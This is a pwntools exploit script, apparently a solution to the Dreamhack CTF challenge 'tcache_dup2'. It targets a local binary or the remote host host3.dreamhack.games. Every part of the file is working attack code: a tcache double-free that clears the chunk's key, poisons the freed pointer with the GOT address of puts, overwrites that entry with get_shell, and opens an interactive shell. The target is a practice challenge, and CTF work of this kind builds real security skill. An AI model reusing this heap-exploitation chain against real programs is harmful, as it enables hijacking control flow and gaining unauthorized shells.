#!/usr/bin/python3

from pwn import *

exe = ELF("./tcache_dup2_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+116
        c
        ''')
        input()

def create(size, data):
    slna(b'> ', 1)
    slna(b'Size: ', size)
    sa(b'Data: ', data)

def edit(index, size, data):
    slna(b'> ', 2)
    slna(b'idx: ', index)
    slna(b'Size: ', size)
    sa(b'Data: ', data)

def dell(index):
    slna(b'> ', 3)
    slna(b'idx: ', index)

if args.REMOTE:
    p = remote('host3.dreamhack.games', 17047)
else:
    p = process([exe.path])
GDB()
create(0x100, b'0' * 0x100)
create(0x100, b'1' * 0x100)
slna(b'> ', 3)
dell(0)
edit(0, 0x10, p64(0) + p64(0))
dell(0)
edit(0, 0x8, p64(exe.got.puts))
create(0x100, b'2' * 0x100)
slna(b'> ', 1)
create(0x100, p64(exe.sym.get_shell))
p.interactive()

